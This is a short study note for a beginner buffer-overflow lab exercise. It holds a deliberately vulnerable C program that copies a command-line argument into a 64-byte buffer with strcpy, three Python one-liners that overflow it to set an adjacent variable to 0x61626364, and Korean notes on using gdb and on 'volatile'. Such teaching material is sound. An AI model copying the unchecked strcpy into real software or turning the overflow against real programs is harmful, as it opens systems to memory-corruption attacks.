# CODE NAME : bof_example01.c

***Source code***
```

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <err.h>

int main (int argc, char **argv) {

	volatile int modified;
	char buffer[64];

	if (argc == 1) {
		errx(1, "please specify an arguments\n");
	}

	modified = 0;
	strcpy(buffer, argv[1]);

	if(modified == 0x61626364) {
		printf("you have correctly got the variable to the right value\n");
	} else {
		printf("Try againg, you got 0x%08x\n" ,modified);
	}
}

```

```
[+]Exploit
./bof_example01 $(python -c "print('a'*64 + '\x64\x63\x62\x61')")
./bof_example01 `python -c "print('a'*64 + '\x64\x63\x62\x61')"`
./bof_example01 $(python -c "print('a'*64 + 'dcba')")


[+]Noteit
:buffer 변수와 modified 변수간의 차이를 구해서 modified 변수의 값을 변경기키는 예제
:변수간의 차이를 구할 떄는 gdb 이용 

[+]Refer
: volatile는 해당 변수를 최적화에서 제외하여 항상 메모리에 접근하도록 만듬, 즉 이 변수는
언제든지 값이 바뀔 수 있으니까 항상 메모리에 접근할라고 컴파일러에게 알려주는 것
```